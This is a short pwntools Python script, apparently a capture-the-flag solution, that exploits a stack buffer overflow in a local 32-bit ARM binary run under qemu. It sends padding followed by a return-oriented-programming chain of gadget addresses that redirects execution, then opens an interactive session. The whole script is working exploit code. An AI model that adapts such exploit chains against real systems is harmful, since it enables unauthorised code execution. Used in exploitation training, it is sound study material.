from pwn import *
context(arch="arm", os="linux", endian="little", word_size=32)

io = process(["qemu-arm", "-L",  "/usr/arm-linux-gnueabi", "-cpu", "cortex-a15", "./pwn"])
#io = process(["qemu-arm", "-L",  "/usr/arm-linux-gnueabi", "-cpu", "cortex-a15", "-g", "1234", "./pwn"])

pop_r3 = 0x000103a4 # pop {r3, pc}
mov_r0_r3 = 0x00010558 # mov r0, r3 ; pop {fp, pc}

pay = b'A'*0x24+ p32(pop_r3) + p32(0x0002103C) + p32(mov_r0_r3) + b'AAAA' + p32(0x000105E0)
io.sendlineafter(b'> ', pay)
io.interactive()
